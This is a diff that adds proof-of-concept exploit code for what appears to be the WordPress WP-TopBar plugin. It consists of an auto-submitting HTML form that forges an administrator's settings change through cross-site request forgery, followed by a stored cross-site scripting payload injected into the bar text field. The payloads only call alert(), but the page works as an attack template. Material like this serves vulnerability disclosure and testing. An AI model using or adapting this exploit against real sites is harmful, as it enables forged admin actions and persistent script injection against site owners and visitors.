@@ -1,0 +1,38 @@
+-------------------
+        CSRF
+-------------------
+ 
+Proof of Concept Code:
+ 
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+<form name="testform" action="
+https://www.example.com/wordpress/wp-admin/admin.php?page=wp-topbar.php&action=topbartext&barid=1"
+method="POST">
+    <br>
+        <input type="hidden" name="wptbbartext"
+value="</script><script>onload=alert(3)</script>">
+        <input type="hidden" name="wptblinktext" value="whatever">
+        <input type="hidden" name="wptblinkurl"
+value="http%3A%2F%2Fwordpress.org%2Fextend%2Fplugins%2Fwp-topbar%2F">
+        <input type="hidden" name="wptblinktarget" value="blank">
+        <input type="hidden" name="wptbenableimage" value="false">
+        <input type="hidden" name="wptbbarimage" value="">
+        <input type="hidden" name="update_wptbSettings"
+value="Update+Settings">
+ 
+</form>
+<script type="text/javascript">
+        document.testform.submit();
+    </script>
+</body>
+</html>
+
+-------------------
+  Stored XSS
+-------------------
+
+</script><script>alert(3)</script>
